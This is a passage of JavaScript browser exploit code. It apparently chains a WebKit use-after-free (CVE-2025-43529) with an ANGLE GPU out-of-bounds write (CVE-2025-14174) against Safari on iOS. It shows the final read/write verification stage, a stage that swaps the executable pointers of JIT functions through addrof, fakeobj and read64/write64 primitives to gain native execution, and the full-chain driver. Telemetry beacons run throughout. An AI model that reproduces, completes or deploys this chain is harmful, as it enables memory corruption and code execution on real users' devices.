            `Verify base=0x${baselineWord.toString(16)} js_before=0x${jsBefore.toString(16)} marker_raw=0x${markerRead.toString(16)} js_marker=0x${jsMarker.toString(16)} restore_raw=0x${restoreRead.toString(16)} js_restore=0x${jsRestore.toString(16)}`,
            (readOk && writeOk) ? 'critical' : 'warn'
        );
        beaconEvent(
            'stage5_end',
            `read=${readOk ? 1 : 0};write=${writeOk ? 1 : 0};live=${baselineMatches ? 1 : 0};marker_ok=${markerMatches ? 1 : 0};restore_ok=${restoreMatches ? 1 : 0};off=0x10;len=${leakedToken.length};base=0x${baselineWord.toString(16)};js_before=0x${jsBefore.toString(16)};marker=0x${markerRead.toString(16)};js_marker=0x${jsMarker.toString(16)};restore=0x${restoreRead.toString(16)};js_restore=0x${jsRestore.toString(16)};addr_live=0x${liveAddr.toString(16)};addr_src=${selected.source};addr_stage1=0x${staleStage1Addr.toString(16)};addr_shift=${movedFromStage1 ? 1 : 0};cands=${encodeURIComponent(candidateNotes.join('|').slice(0, 220))}`
        );
        return readOk && writeOk;
    } catch (e) {
        log(`Stage 5 failed: ${e.message}`, 'fail');
        beaconEvent('stage5_end', `read=0;write=0;reason=exception_${encodeURIComponent((e.message || 'unknown').slice(0, 80))}`);
        return false;
    }
}

// =============================================================================
// STAGE 6: Native Execution Proof (PC/Code Path Control)
// =============================================================================
//
// Strategy:
// 1) JIT two functions with different native behavior
// 2) overwrite a likely executable field in function A with function B's value
// 3) verify A executes B behavior, then restore
// =============================================================================

async function runStage6(options = {}) {
    const quickMode = !!options.quick;
    const quietMode = !!options.quiet;
    const probeOnly = !!options.probeOnly;
    const s6log = (msg, type = 'info') => {
        if (!quietMode) log(msg, type);
    };
    if (evidence.nativeExecWorks && exploitState.nativeExecDetails && exploitState.nativeExecDetails.includes('mode=hot_swap')) {
        exploitState.stage6Complete = true;
        beaconEvent('stage6_end', `native=1;mode=reuse_hot_swap;${exploitState.nativeExecDetails}`);
        return true;
    }
    s6log('\n========================================', 'stage3');
    s6log('STAGE 6: Native Execution Proof', 'stage3');
    s6log('========================================', 'stage3');
    beaconEvent('stage6_start', `runStage6;quick=${quickMode ? 1 : 0};src=${options.source || 'default'}`);

    if (!exploitState.stablePrimitivesReady ||
        typeof exploitState.read64 !== 'function' ||
        typeof exploitState.write64 !== 'function' ||
        typeof exploitState.addrof !== 'function') {
        s6log('Stage 6 failed: stable primitives unavailable', 'fail');
        evidence.nativeExecWorks = false;
        exploitState.stage6Complete = false;
        beaconEvent('stage6_end', 'native=0;reason=no_primitives');
        return false;
    }

    try {
        const jitSwapA = preAllocatedTargets.stage6FuncA;
        const jitSwapB = preAllocatedTargets.stage6FuncB;

        for (let i = 0; i < (quickMode ? 8000 : 50000); i++) {
            jitSwapA(i);
            jitSwapB(i);
        }

        const testArg = 123456 | 0;
        const beforeA = jitSwapA(testArg) | 0;
        const beforeB = jitSwapB(testArg) | 0;
        if (beforeA === beforeB) {
            s6log('Stage 6 failed: JIT functions are not behavior-distinct', 'fail');
            evidence.nativeExecWorks = false;
            exploitState.stage6Complete = false;
            beaconEvent('stage6_end', 'native=0;reason=no_behavior_delta');
            return false;
        }

        const leakA = exploitState.leakedAddresses?.stage6FuncA || 0n;
        const leakB = exploitState.leakedAddresses?.stage6FuncB || 0n;
        const nowA = exploitState.addrof(jitSwapA);
        const nowB = exploitState.addrof(jitSwapB);
        let directA = 0n;
        let directB = 0n;
        try {
            const ba = exploitState.boxedArray;
            const ua = exploitState.unboxedArray;
            if (ba && ua && ba.length > 0 && ua.length > 0) {
                ba[0] = jitSwapA;
                directA = ftoi(ua[0]);
                ba[0] = jitSwapB;
                directB = ftoi(ua[0]);
            }
        } catch (_) {}
        const scanSamples = [];
        let scannedA = 0n;
        let scannedB = 0n;
        const foundA = [];
        const foundB = [];

        // Recover real JSFunction cell addresses via fakeobj() neighborhood scan.
        // We scan both leak neighborhoods for both behaviors to handle A/B drift.
        if (!quickMode && typeof exploitState.fakeobj === 'function') {
            const scanBases = [];
            if (leakA !== 0n) scanBases.push({ base: leakA, label: 'LA' });
            if (leakB !== 0n) scanBases.push({ base: leakB, label: 'LB' });
            if (nowA !== 0n) scanBases.push({ base: nowA, label: 'NA' });
            if (nowB !== 0n) scanBases.push({ base: nowB, label: 'NB' });
            const addHit = (arr, v) => {
                if (arr.length >= 16) return;
                if (!arr.some(x => x === v)) arr.push(v);
            };
            const scanRadius = quickMode ? 0x2000n : 0x8000n;
            const scanStep = quickMode ? 0x10n : 0x8n;
            for (const b of scanBases) {
                for (let d = -scanRadius; d <= scanRadius; d += scanStep) {
                    const probe = b.base + d;
                    try {
                        const obj = exploitState.fakeobj(probe);
                        if (typeof obj !== 'function') continue;
                        let out = 0;
                        try { out = obj(testArg) | 0; } catch (_) { continue; }
                        if (scanSamples.length < 12) {
                            scanSamples.push(`${b.label}${d >= 0n ? '+' : ''}0x${d.toString(16)}=>${out}`);
                        }
                        if (out === beforeA) addHit(foundA, probe);
                        if (out === beforeB) addHit(foundB, probe);
                    } catch (_) {}
                }
            }
            if (foundA.length && foundB.length) {
                outer:
                for (const a of foundA) {
                    for (const b of foundB) {
                        if (a !== b) {
                            scannedA = a;
                            scannedB = b;
                            break outer;
                        }
                    }
                }
            }
        }

        const sourcePairs = [];
        const EXECUTABLE_FIELD_OFF = 0x18n; // IDA: JSFunction::getCallData loads [this + 0x18]
        const baseDeltas = quickMode
            ? [-0x20n, -0x10n, -0x8n, 0x0n, 0x8n, 0x10n, 0x18n, 0x20n]
            : [
                -0x100n, -0x80n, -0x60n, -0x40n, -0x30n, -0x20n, -0x18n, -0x10n, -0x8n,
                0x0n,
                0x8n, 0x10n, 0x18n, 0x20n, 0x30n, 0x40n, 0x60n, 0x80n, 0x100n
            ];
        const addSourcePairSet = (label, a0, b0) => {
            for (const d of baseDeltas) {
                sourcePairs.push({
                    source: `${label}${d >= 0n ? '_p' : '_m'}0x${(d >= 0n ? d : -d).toString(16)}`,
                    a: a0 + d,
                    b: b0 + d
                });
            }
        };
        // Prefer leak-time addresses; current addrof can collapse after GC churn.
        if (!quickMode && foundA.length && foundB.length) {
            for (let i = 0; i < Math.min(foundA.length, 6); i++) {
                for (let j = 0; j < Math.min(foundB.length, 6); j++) {
                    if (foundA[i] === foundB[j]) continue;
                    sourcePairs.push({ source: `scan_hit_${i}_${j}`, a: foundA[i], b: foundB[j] });
                }
            }
        }
        if (!quickMode && scannedA !== 0n && scannedB !== 0n) addSourcePairSet('scan', scannedA, scannedB);
        if (leakA !== 0n && leakB !== 0n) addSourcePairSet('leak', leakA, leakB);
        if (directA !== 0n && directB !== 0n) addSourcePairSet('direct', directA, directB);
        if (nowA !== 0n && nowB !== 0n) addSourcePairSet('addrof', nowA, nowB);

        const canScoreWord = (w) => w !== 0n && w !== 0x7ff8000000000000n;
        let bestPair = null;
        const scoreOffsets = [0x8n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n, 0x38n, 0x40n];

        for (const p of sourcePairs) {
            if (p.a === p.b) continue;
            let nonNan = 0;
            let diffs = 0;
            for (const off of scoreOffsets) {
                const va = exploitState.read64(p.a + off);
                const vb = exploitState.read64(p.b + off);
                if (canScoreWord(va) || canScoreWord(vb)) nonNan++;
                if (va !== vb) diffs++;
            }
            const score = (nonNan * 100) + diffs;
            if (!bestPair || score > bestPair.score) {
                bestPair = { ...p, score, nonNan, diffs };
            }
        }

        let addrA = bestPair ? bestPair.a : leakA;
        let addrB = bestPair ? bestPair.b : leakB;
        let addrSource = bestPair ? bestPair.source : 'leak';
        let eqInfo = 'eq=na';
        if (typeof exploitState.fakeobj === 'function') {
            const checkEq = (label, addr) => {
                if (addr === 0n) return `${label}:none`;
                try {
                    const o = exploitState.fakeobj(addr);
                    return `${label}:A${o === jitSwapA ? 1 : 0}B${o === jitSwapB ? 1 : 0}T${typeof o}`;
                } catch (_) {
                    return `${label}:err`;
                }
            };
            eqInfo = [
                checkEq('leakA', leakA),
                checkEq('leakB', leakB),
                checkEq('nowA', nowA),
                checkEq('nowB', nowB),
            ].join(',');
        }
        const addrDebug = `leakA=0x${leakA.toString(16)};leakB=0x${leakB.toString(16)};directA=0x${directA.toString(16)};directB=0x${directB.toString(16)};scanA=0x${scannedA.toString(16)};scanB=0x${scannedB.toString(16)};foundA=${foundA.slice(0,4).map(v=>`0x${v.toString(16)}`).join(',')};foundB=${foundB.slice(0,4).map(v=>`0x${v.toString(16)}`).join(',')};nowA=0x${nowA.toString(16)};nowB=0x${nowB.toString(16)};${eqInfo}${bestPair ? `;score=${bestPair.score};nonNan=${bestPair.nonNan};diffs=${bestPair.diffs}` : ''};scan_samples=${scanSamples.join('|')}`;

        if (bestPair) {
            s6log(`Stage 6 address scoring: source=${bestPair.source} score=${bestPair.score} nonNan=${bestPair.nonNan} diffs=${bestPair.diffs}`, 'info');
        }

        if (addrA === 0n || addrB === 0n || addrA === addrB) {
            evidence.nativeExecWorks = false;
            exploitState.stage6Complete = false;
            exploitState.nativeExecDetails = `beforeA=${beforeA};beforeB=${beforeB};addrA=0x${addrA.toString(16)};addrB=0x${addrB.toString(16)};same_addr=1;source=${addrSource};${addrDebug}`;
            s6log('Stage 6 failed: function addresses collapsed (A == B)', 'fail');
            beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
            return false;
        }

        // Targeted executable pointer swap first, using IDA-confirmed offset.
        // First try JSValue slot copy to avoid read64()/itof() NaN canonicalization.
        let targetedJsValueHit = null;
        for (const p of sourcePairs) {
            if (p.a === 0n || p.b === 0n || p.a === p.b) continue;
            const h = attemptHotNativeSwapBySlotCopy(p.a, p.b, jitSwapA, jitSwapB);
            if (h.ok) {
                targetedJsValueHit = { source: p.source, ...h };
                break;
            }
        }
        if (targetedJsValueHit) {
            const details = `mode=exec_off_0x18_slotcopy;source=${targetedJsValueHit.source};fieldA=0x${targetedJsValueHit.fieldA.toString(16)};fieldB=0x${targetedJsValueHit.fieldB.toString(16)};donorType=${targetedJsValueHit.donorType || 'unknown'};beforeA=${targetedJsValueHit.beforeA};beforeB=${targetedJsValueHit.beforeB};swapped=${targetedJsValueHit.swapped};restored=${targetedJsValueHit.restored};w0=${targetedJsValueHit.w0};w1=${targetedJsValueHit.w1};w2=${targetedJsValueHit.w2};w3=${targetedJsValueHit.w3};${addrDebug}`;
            evidence.nativeExecWorks = true;
            exploitState.stage6Complete = true;
            exploitState.nativeExecDetails = details;
            s6log('Native execution proof: SUCCESS (direct executable field slot-copy @ +0x18)', 'critical');
            s6log(`Native proof details: ${details}`, 'critical');
            beaconEvent('stage6_end', `native=1;${details}`);
            return true;
        }

        const targetedSamples = [];
        let firstExecDiff = null;
        let targetedHit = null;
        for (const p of sourcePairs) {
            if (p.a === 0n || p.b === 0n || p.a === p.b) continue;
            const fieldAddrA = p.a + EXECUTABLE_FIELD_OFF;
            const fieldAddrB = p.b + EXECUTABLE_FIELD_OFF;
            const execA = exploitState.read64(fieldAddrA);
            const execB = exploitState.read64(fieldAddrB);
            if (targetedSamples.length < 8) {
                targetedSamples.push(`src=${p.source};a=0x${execA.toString(16)};b=0x${execB.toString(16)}`);
            }
            if (execA === 0n || execB === 0n || execA === execB) continue;
            if (execA === 0x7ff8000000000000n || execB === 0x7ff8000000000000n) continue;
            if (!firstExecDiff) {
                firstExecDiff = {
                    source: p.source,
                    fieldAddrA,
                    fieldAddrB,
                    execA,
                    execB
                };
            }
            if (probeOnly) continue;
            try {
                exploitState.write64(fieldAddrA, execB);
                const swapped = jitSwapA(testArg) | 0;
                exploitState.write64(fieldAddrA, execA);
                const restored = jitSwapA(testArg) | 0;
                if (swapped === beforeB && restored === beforeA) {
                    targetedHit = {
                        source: p.source,
                        fieldAddrA,
                        fieldAddrB,
                        execA,
                        execB,
                        swapped,
                        restored
                    };
                    break;
                }
            } catch (e) {
                try { exploitState.write64(fieldAddrA, execA); } catch (_) {}
            }
        }

        if (probeOnly) {
            evidence.nativeExecWorks = false;
            exploitState.stage6Complete = false;
            exploitState.nativeExecDetails = firstExecDiff
                ? `probe_only=1;source=${firstExecDiff.source};fieldA=0x${firstExecDiff.fieldAddrA.toString(16)};fieldB=0x${firstExecDiff.fieldAddrB.toString(16)};execA=0x${firstExecDiff.execA.toString(16)};execB=0x${firstExecDiff.execB.toString(16)};beforeA=${beforeA};beforeB=${beforeB};${addrDebug};exec_samples=${targetedSamples.join('|')}`
                : `probe_only=1;beforeA=${beforeA};beforeB=${beforeB};${addrDebug};exec_samples=${targetedSamples.join('|')}`;
            beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
            return false;
        }

        if (targetedHit) {
            const details = `mode=exec_off_0x18;source=${targetedHit.source};fieldA=0x${targetedHit.fieldAddrA.toString(16)};fieldB=0x${targetedHit.fieldAddrB.toString(16)};execA=0x${targetedHit.execA.toString(16)};execB=0x${targetedHit.execB.toString(16)};beforeA=${beforeA};beforeB=${beforeB};swapped=${targetedHit.swapped};restored=${targetedHit.restored};${addrDebug}`;
            evidence.nativeExecWorks = true;
            exploitState.stage6Complete = true;
            exploitState.nativeExecDetails = details;
            s6log('Native execution proof: SUCCESS (direct executable field swap @ +0x18)', 'critical');
            s6log(`Native proof details: ${details}`, 'critical');
            beaconEvent('stage6_end', `native=1;${details}`);
            return true;
        }

        // Fallback: copy raw JSValue payloads across candidate fields via fakeobj().
        // This bypasses ftoi()/itof() canonicalization when read64() collapses to NaN.
        const jsValueSamples = [];
        const jsValueOffsets = [];
        for (let off = 0x8n; off <= 0x180n; off += 0x8n) {
            jsValueOffsets.push(off);
        }
        const jsValueInlineOff = 0x10n;
        let jsValueHit = null;
        if (typeof exploitState.fakeobj === 'function') {
            for (const p of sourcePairs) {
                if (p.a === 0n || p.b === 0n || p.a === p.b) continue;
                for (const off of jsValueOffsets) {
                    const slotBaseA = p.a + off - jsValueInlineOff;
                    const slotBaseB = p.b + off - jsValueInlineOff;
                    try {
                        const fakeDst = exploitState.fakeobj(slotBaseA);
                        const fakeSrc = exploitState.fakeobj(slotBaseB);
                        const origVal = fakeDst.slot0;
                        const donorVal = fakeSrc.slot0;
                        if (jsValueSamples.length < 8) {
                            jsValueSamples.push(`src=${p.source};off=0x${off.toString(16)};t=${typeof donorVal}`);
                        }
                        if (typeof donorVal === 'undefined' || donorVal === null) {
                            continue;
                        }
                        fakeDst.slot0 = donorVal;
                        const swapped = jitSwapA(testArg) | 0;
                        fakeDst.slot0 = origVal;
                        const restored = jitSwapA(testArg) | 0;
                        if (swapped === beforeB && restored === beforeA) {
                            jsValueHit = { source: p.source, off, swapped, restored, donorType: typeof donorVal };
                            break;
                        }
                    } catch (e) {
                        // Ignore and continue probing.
                    }
                }
                if (jsValueHit) break;
            }
        }

        if (jsValueHit) {
            const details = `mode=jsvalue_copy;source=${jsValueHit.source};off=0x${jsValueHit.off.toString(16)};type=${jsValueHit.donorType};beforeA=${beforeA};beforeB=${beforeB};swapped=${jsValueHit.swapped};restored=${jsValueHit.restored};${addrDebug}`;
            evidence.nativeExecWorks = true;
            exploitState.stage6Complete = true;
            exploitState.nativeExecDetails = details;
            s6log('Native execution proof: SUCCESS (JSValue field copy fallback)', 'critical');
            s6log(`Native proof details: ${details}`, 'critical');
            beaconEvent('stage6_end', `native=1;${details}`);
            return true;
        }

        const allDiffs = [];
        const pointerishOffsets = [];
        for (let off = 0x8n; off <= 0x400n; off += 0x8n) {
            const fieldA = exploitState.read64(addrA + off);
            const fieldB = exploitState.read64(addrB + off);
            if (fieldA === fieldB) continue;
            allDiffs.push({ off, fieldA, fieldB });
            if (isLikelyNativePtr(fieldA) || isLikelyNativePtr(fieldB)) {
                pointerishOffsets.push(off);
            }
        }

        const pointerishSet = new Set(pointerishOffsets.map(v => v.toString(16)));
        const candidateOffsets = pointerishOffsets.concat(
            allDiffs
                .map(e => e.off)
                .filter(off => !pointerishSet.has(off.toString(16)))
        );

        s6log(`Stage 6 function addrs: A=0x${addrA.toString(16)} B=0x${addrB.toString(16)} source=${addrSource}`, 'info');
        s6log(`Stage 6 diff scan: total_diffs=${allDiffs.length} pointerish=${pointerishOffsets.length}`, allDiffs.length ? 'info' : 'warn');
        if (allDiffs.length) {
            const sample = allDiffs.slice(0, 8).map(d => `0x${d.off.toString(16)}:0x${d.fieldA.toString(16)}->0x${d.fieldB.toString(16)}`).join(', ');
            s6log(`Stage 6 diff sample: ${sample}`, 'info');
        }
        if (!allDiffs.length) {
            const probeOffsets = [0x8n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n];
            const probes = [];
            for (const off of probeOffsets) {
                const va = exploitState.read64(addrA + off);
                const vb = exploitState.read64(addrB + off);
                probes.push(`0x${off.toString(16)}:0x${va.toString(16)}|0x${vb.toString(16)}`);
            }
            evidence.nativeExecWorks = false;
            exploitState.stage6Complete = false;
            exploitState.nativeExecDetails = `beforeA=${beforeA};beforeB=${beforeB};addrA=0x${addrA.toString(16)};addrB=0x${addrB.toString(16)};no_diff_offsets=1;source=${addrSource};${addrDebug};probes=${probes.join(',')};exec_samples=${targetedSamples.join('|')};jsv_samples=${jsValueSamples.join('|')}`;
            beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
            return false;
        }

        let success = false;
        let hitOffset = 0n;
        let swappedResult = 0;
        let restoredResult = 0;
        const maxTests = 64;
        let tested = 0;

        for (const off of candidateOffsets) {
            if (tested >= maxTests) break;
            tested++;
            const fieldAddrA = addrA + off;
            const fieldAddrB = addrB + off;
            const fieldA = exploitState.read64(fieldAddrA);
            const fieldB = exploitState.read64(fieldAddrB);

            if (fieldA === fieldB) {
                continue;
            }

            let restoredField = false;
            try {
                exploitState.write64(fieldAddrA, fieldB);
                swappedResult = jitSwapA(testArg) | 0;
            } catch (e) {
                // Try next candidate after restore.
            } finally {
                try {
                    exploitState.write64(fieldAddrA, fieldA);
                    restoredField = true;
                } catch (e) {
                    restoredField = false;
                }
            }

            try {
                restoredResult = jitSwapA(testArg) | 0;
            } catch (e) {
                restoredResult = 0;
            }

            if (restoredField && swappedResult === beforeB && restoredResult === beforeA) {
                success = true;
                hitOffset = off;
                break;
            }
        }

        evidence.nativeExecWorks = success;
        exploitState.stage6Complete = success;
        exploitState.nativeExecDetails = success
            ? `off=0x${hitOffset.toString(16)};beforeA=${beforeA};beforeB=${beforeB};swapped=${swappedResult};restored=${restoredResult};diffs=${allDiffs.length};ptrish=${pointerishOffsets.length};candidates=${candidateOffsets.length};tested=${tested};source=${addrSource};${addrDebug}`
            : `beforeA=${beforeA};beforeB=${beforeB};no_offset_match=1;diffs=${allDiffs.length};ptrish=${pointerishOffsets.length};candidates=${candidateOffsets.length};tested=${tested};source=${addrSource};${addrDebug}`;

        if (success) {
            s6log('Native execution proof: SUCCESS (function A executed function B behavior)', 'critical');
            s6log(`Native proof details: ${exploitState.nativeExecDetails}`, 'critical');
            beaconEvent('stage6_end', `native=1;${exploitState.nativeExecDetails}`);
            return true;
        }

        s6log('Native execution proof: FAILED (no safe executable-field swap found)', 'warn');
        beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
        return false;
    } catch (e) {
        evidence.nativeExecWorks = false;
        exploitState.stage6Complete = false;
        s6log(`Stage 6 failed: ${e.message}`, 'fail');
        beaconEvent('stage6_end', `native=0;reason=exception_${encodeURIComponent((e.message || 'unknown').slice(0, 80))}`);
        return false;
    }
}

async function runFullChain() {
    beaconEvent('chain_start', 'runFullChain');
    log('\n================================================', 'critical');
    log('FULL EXPLOIT CHAIN: CVE-2025-43529 + CVE-2025-14174', 'critical');
    log('================================================', 'critical');

    document.querySelectorAll('button').forEach(b => b.disabled = true);

    const results = {
        stage1: false,
        stage2: false,
        stage3: false,
        stage4: false,
        stage5: false,
        stage6: false,
    };
    evidence.sensitiveDataRead = false;
    evidence.fullChainSuccess = false;
    evidence.arbRWWorks = false;
    evidence.nativeExecWorks = false;
    exploitState.stage5Complete = false;
    exploitState.stage6Complete = false;
    exploitState.leakedSensitive = '';
    exploitState.nativeExecDetails = '';
    let stage3DurationMs = 0;

    try {
        // Stage 2 first: establish WebGL/GPU harness before UAF heap pressure
        results.stage2 = await runStage2();
        await new Promise(r => setTimeout(r, 100));

        // Stage 3 before Stage 1: keep renderer heap churn from perturbing GPU trigger setup
        if (results.stage2) {
            const stage3StartTs = performance.now();
            results.stage3 = await runStage3();
            stage3DurationMs = performance.now() - stage3StartTs;
            log(`Stage 3 duration: ${Math.round(stage3DurationMs)}ms`, 'info');
            await new Promise(r => setTimeout(r, 100));
        }

        // Stage 1: WebKit UAF
        results.stage1 = await runStage1();

        // Stage 6 first after Stage 1: native proof is most sensitive to primitive drift.
        if (results.stage1) {
            results.stage6 = await runStage6();
            results.stage5 = await runStage5();
            await new Promise(r => setTimeout(r, 100));
        } else {
            log('Skipping Stage 5: Stage 1 did not complete', 'warn');
            log('Skipping Stage 6: Stage 1 did not complete', 'warn');
        }

        // If GPU evidence is still absent, try one more Stage 3 pass
        if (results.stage2 && !evidence.angleCorruptionDetected && !evidence.gpuContextLost) {
            if (stage3DurationMs <= 5000) {
                log('No GPU evidence yet; running Stage 3 retry pass', 'warn');
                const retryStage3 = await runStage3();
                results.stage3 = results.stage3 || retryStage3;
                await new Promise(r => setTimeout(r, 100));
            } else {
                log(`Skipping Stage 3 retry (initial pass was long: ${Math.round(stage3DurationMs)}ms) to avoid GPU/UI stalls`, 'warn');
            }
        }

        // Stage 4: integration gate
        results.stage4 = await runStage4();
        evidence.fullChainSuccess = (
            results.stage4 &&
            results.stage5 &&
            results.stage6 &&
            evidence.sensitiveDataRead &&
            evidence.nativeExecWorks
        );

    } catch (e) {
        log(`Chain execution error: ${e.message}`, 'fail');
        log(`Error stack: ${e.stack?.split('\n').slice(0,3).join(' | ') || 'no stack'}`, 'fail');
    }

    // Print final results
    log('\n================================================', 'critical', resultsDiv);
    log('EXPLOIT CHAIN RESULTS', 'critical', resultsDiv);
    log('================================================', 'critical', resultsDiv);
    log(`Stage 1 (WebKit UAF): ${results.stage1 ? 'SUCCESS' : 'FAILED'}`, results.stage1 ? 'success' : 'fail', resultsDiv);
    log(`Stage 2 (GPU Harness): ${results.stage2 ? 'SUCCESS' : 'FAILED'}`, results.stage2 ? 'success' : 'fail', resultsDiv);
    log(`Stage 3 (ANGLE OOB): ${results.stage3 ? 'SUCCESS' : 'FAILED'}`, results.stage3 ? 'success' : 'fail', resultsDiv);
    log(`Stage 4 (Chain Gate): ${results.stage4 ? 'SUCCESS' : 'FAILED'}`, results.stage4 ? 'success' : 'fail', resultsDiv);
    log(`Stage 5 (Live In-Process R/W): ${results.stage5 ? 'SUCCESS' : 'FAILED'}`, results.stage5 ? 'success' : 'fail', resultsDiv);
    log(`Stage 6 (Native Exec Proof): ${results.stage6 ? 'SUCCESS' : 'FAILED'}`, results.stage6 ? 'success' : 'fail', resultsDiv);

    log('\n--- EXPLOIT STATUS ---', 'critical', resultsDiv);

    if (evidence.fullChainSuccess) {
        log('FULL CHAIN (PoC) SUCCESS: chain gate + live R/W + native behavior swap proven', 'critical', resultsDiv);
        log(`  • Sensitive leak: ${exploitState.leakedSensitive}`, 'critical', resultsDiv);
        if (results.stage6) {
            log(`  • Native execution proof: ${exploitState.nativeExecDetails}`, 'critical', resultsDiv);
        }
    } else if (evidence.chainReady) {
        log('CHAIN READY: renderer primitives + GPU-process evidence captured', 'critical', resultsDiv);
        log('  • CVE-2025-43529: addrof/fakeobj verified in renderer', 'success', resultsDiv);
        log('  • CVE-2025-14174: ANGLE trigger + heap-oracle/GPU-canary evidence', 'success', resultsDiv);
        log('  • Stage 5 sensitive read/write proof not yet achieved in this run', 'warn', resultsDiv);
    } else if (results.stage1 && results.stage3) {
        log('BOTH PATHS EXECUTED: rerun for stronger GPU corruption evidence', 'warn', resultsDiv);
        log('  • Renderer primitives present', evidence.addrofWorks && evidence.fakeobjWorks ? 'success' : 'warn', resultsDiv);
        log('  • Heap-oracle/canary corruption and context-loss not observed this run', 'warn', resultsDiv);
    } else if (results.stage1) {
        log('PARTIAL: renderer-only evidence', 'warn', resultsDiv);
        log('  • addrof/fakeobj path reached', 'success', resultsDiv);
    } else if (results.stage3) {
        log('PARTIAL: GPU-path evidence only', 'warn', resultsDiv);
        log('  • ANGLE trigger path reached without renderer primitive capture', 'warn', resultsDiv);
    } else {
        log('NO EFFECT OBSERVED', 'warn', resultsDiv);
        log('Neither stage produced usable evidence in this run', 'warn', resultsDiv);
    }

    // Log CVE details
    log('\n--- VULNERABILITY DETAILS ---', 'info', resultsDiv);
    log('CVE-2025-43529 (WebKit UAF):', 'info', resultsDiv);
    log('  Impact: Arbitrary code execution via type confusion', 'info', resultsDiv);
    log('  Vector: DFG Store Barrier Insertion Phase bug', 'info', resultsDiv);
    log('', 'info', resultsDiv);
    log('CVE-2025-14174 (ANGLE OOB):', 'info', resultsDiv);
    log('  Impact: Out-of-bounds write in GPU process', 'info', resultsDiv);
    log('  Vector: UNPACK_IMAGE_HEIGHT staging buffer undersize', 'info', resultsDiv);
    log('', 'info', resultsDiv);
    log('Current gate: chain is marked ready only with renderer + GPU evidence', 'critical', resultsDiv);
    log('Attack surface: Safari/WebKit on iOS 26.1', 'info', resultsDiv);

    logEvidenceSummary(resultsDiv);
    if (AUTO_COPY_AFTER_CHAIN) {
        const copied = await copyOutput(document.getElementById('copyOutputBtn'));
        log(`Auto-copy after chain: ${copied ? 'SUCCESS' : 'FAILED'}`, copied ? 'success' : 'warn', resultsDiv);
    }
    beaconEvent(
        'chain_end',
        `stage1=${results.stage1 ? 1 : 0};stage2=${results.stage2 ? 1 : 0};stage3=${results.stage3 ? 1 : 0};stage4=${results.stage4 ? 1 : 0};stage5=${results.stage5 ? 1 : 0};stage6=${results.stage6 ? 1 : 0};ready=${evidence.chainReady ? 1 : 0};sensitive=${evidence.sensitiveDataRead ? 1 : 0};native=${evidence.nativeExecWorks ? 1 : 0};full=${evidence.fullChainSuccess ? 1 : 0}`
    );
    updateProgress(100, 100, 'Chain Complete');
    document.querySelectorAll('button').forEach(b => b.disabled = false);
}
